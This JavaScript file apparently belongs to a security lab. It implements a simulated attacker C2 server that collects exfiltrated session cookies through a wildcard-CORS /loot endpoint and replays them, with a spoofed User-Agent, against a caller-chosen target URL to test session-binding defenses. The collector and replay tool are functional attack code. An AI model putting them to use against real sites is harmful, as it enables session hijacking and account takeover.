/**
 * Attacker Simulation Server (Standalone on Port 4000)
 * Simulates a malicious Adversary / C2 server capturing exfiltrated cookies
 * and demonstrating session replay attack defenses.
 */

const express = require('express');
const http = require('http');

const app = express();
const ATTACKER_PORT = process.env.ATTACKER_PORT || 4000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Enable CORS so the attacker script can send stolen data from any origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Stored loot in-memory
const stolenCookies = [];

// Endpoint to receive exfiltrated cookies (Flow A: Attack)
app.post('/loot', (req, res) => {
  const { cookie, origin, userAgent, timestamp } = req.body;
  const lootEntry = {
    id: stolenCookies.length + 1,
    cookie: cookie || 'EMPTY',
    origin: origin || 'Unknown',
    userAgent: userAgent || req.headers['user-agent'],
    clientIP: req.ip || req.connection.remoteAddress,
    receivedAt: timestamp || new Date().toISOString()
  };

  stolenCookies.push(lootEntry);
  console.log('\n========================================');
  console.log('🚨 [ATTACKER C2 LOOT RECEIVED] 🚨');
  console.log(`Victim Origin: ${lootEntry.origin}`);
  console.log(`Stolen Cookie: ${lootEntry.cookie}`);
  console.log(`Attacker IP:   ${lootEntry.clientIP}`);
  console.log('========================================\n');

  res.json({
    success: true,
    message: 'Cookie successfully exfiltrated to attacker server!',
    loot: lootEntry
  });
});

// Endpoint to inspect stolen loot
app.get('/api/loot', (req, res) => {
  res.json({
    totalStolen: stolenCookies.length,
    loot: stolenCookies
  });
});

// Endpoint to simulate Session Replay attack against VeloTech server
app.post('/api/simulate-replay', async (req, res) => {
  const { targetUrl = 'http://localhost:3000/api/session-info', rawCookie } = req.body;

  console.log(`[*] Attacker attempting session replay against: ${targetUrl}`);
  console.log(`[*] Using Cookie: ${rawCookie}`);

  try {
    // Make request using native fetch, injecting spoofed attacker headers
    const response = await fetch(targetUrl, {
      method: 'GET',
      headers: {
        'Cookie': rawCookie,
        'User-Agent': 'Mozilla/5.0 (Kali-Linux; AdversaryAitM/1.0; ReplayBot)',
        'Accept': 'application/json'
      }
    });

    const statusCode = response.status;
    let data;
    try {
      data = await response.json();
    } catch {
      data = await response.text();
    }

    if (statusCode === 200) {
      console.log('❌ [REPLAY SUCCESS - VULNERABLE]: Target accepted stolen cookie without validation!');
      return res.json({
        result: 'REPLAY_SUCCESSFUL',
        status: statusCode,
        message: 'Adversary successfully accessed protected dashboard using stolen cookie!',
        data
      });
    } else {
      console.log(`🛡️ [REPLAY BLOCKED - DEFENDED]: Target rejected replay! Status: ${statusCode}`);
      return res.json({
        result: 'REPLAY_BLOCKED',
        status: statusCode,
        message: 'Target server rejected stolen session! Session Binding or HttpOnly defended the session.',
        response: data
      });
    }
  } catch (err) {
    return res.status(500).json({
      result: 'ERROR',
      error: `Failed to connect to target server: ${err.message}`
    });
  }
});

// Attacker C2 Dashboard Web UI
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Adversary C2 Server - Exfiltration Listener</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap">
      <style>
        body {
          background: #0a0a0f;
          color: #ff5555;
          font-family: 'JetBrains Mono', monospace;
          margin: 0;
          padding: 2rem;
        }
        .header {
          border-bottom: 2px solid #ff5555;
          padding-bottom: 1rem;
          margin-bottom: 1.5rem;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .container {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 2rem;
        }
        .box {
          background: #12131c;
          border: 1px solid #ff555555;
          border-radius: 8px;
          padding: 1.5rem;
        }
        h2 { margin-top: 0; color: #ff7777; font-size: 1.1rem; }
        .loot-item {
          background: #08080d;
          border: 1px dashed #ff555588;
          padding: 1rem;
          margin-bottom: 1rem;
          border-radius: 6px;
          word-break: break-all;
        }
        .btn {
          background: #ff5555;
          color: #000;
          border: none;
          padding: 0.6rem 1.2rem;
          font-family: inherit;
          font-weight: 700;
          cursor: pointer;
          border-radius: 4px;
        }
        .btn:hover { background: #ff7777; }
        .input-group { margin-bottom: 1rem; }
        input {
          width: 100%;
          background: #08080d;
          border: 1px solid #ff555577;
          color: #00ff9d;
          padding: 0.6rem;
          border-radius: 4px;
          box-sizing: border-box;
          font-family: inherit;
        }
        pre {
          background: #050508;
          padding: 1rem;
          border-radius: 4px;
          color: #00ff9d;
          overflow-x: auto;
          max-height: 200px;
        }
      </style>
    </head>
    <body>
      <div class="header">
        <div>
          <h1>☠️ ADVERSARY C2 LISTENER (PORT ${ATTACKER_PORT})</h1>
          <p style="color: #aaa; margin: 0;">Simulated Cross-Origin AitM / Exfiltration Server</p>
        </div>
        <button class="btn" onclick="location.reload()">Refresh Loot</button>
      </div>

      <div class="container">
        <div class="box">
          <h2>📦 Stolen Session Loot (${stolenCookies.length})</h2>
          ${stolenCookies.length === 0
      ? '<p style="color: #666;">No cookies captured yet. Trigger the attack script on the Vulnerable Login or Dashboard.</p>'
      : stolenCookies.map(l => `
              <div class="loot-item">
                <div><strong>Loot #${l.id}</strong> - ${l.receivedAt}</div>
                <div style="color: #00e5ff; margin-top: 0.3rem;"><strong>Cookie:</strong> ${l.cookie}</div>
                <div style="color: #888; font-size: 0.75rem; margin-top: 0.3rem;">From: ${l.origin} | IP: ${l.clientIP}</div>
              </div>
            `).reverse().join('')
    }
        </div>

        <div class="box">
          <h2>⚡ Session Replay Simulator</h2>
          <p style="color: #bbb; font-size: 0.85rem;">Test replaying a stolen cookie from an attacker's environment to see if Session Binding blocks it.</p>
          <div class="input-group">
            <label style="color: #aaa;">Target Endpoint:</label>
            <input id="targetUrl" value="http://localhost:3000/api/session-info">
          </div>
          <div class="input-group">
            <label style="color: #aaa;">Cookie to Replay:</label>
            <input id="replayCookie" value="${stolenCookies.length > 0 ? stolenCookies[stolenCookies.length - 1].cookie : 'session=1234'}">
          </div>
          <button class="btn" onclick="triggerReplay()">Execute Replay Attack</button>
          
          <h3 style="color: #aaa; margin-top: 1.5rem; font-size: 0.9rem;">Replay Result:</h3>
          <pre id="replayResult">// Replay attack telemetry will appear here...</pre>
        </div>
      </div>

      <script>
        async function triggerReplay() {
          const targetUrl = document.getElementById('targetUrl').value;
          const rawCookie = document.getElementById('replayCookie').value;
          const resultEl = document.getElementById('replayResult');
          resultEl.innerText = '[*] Sending request with attacker spoofed User-Agent...';

          try {
            const res = await fetch('/api/simulate-replay', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ targetUrl, rawCookie })
            });
            const data = await res.json();
            resultEl.innerText = JSON.stringify(data, null, 2);
          } catch (e) {
            resultEl.innerText = 'Error: ' + e.message;
          }
        }
      </script>
    </body>
    </html>
  `);
});

app.listen(ATTACKER_PORT, () => {
  console.log(`[+] Attacker Simulation Server listening on http://localhost:${ATTACKER_PORT}`);
});
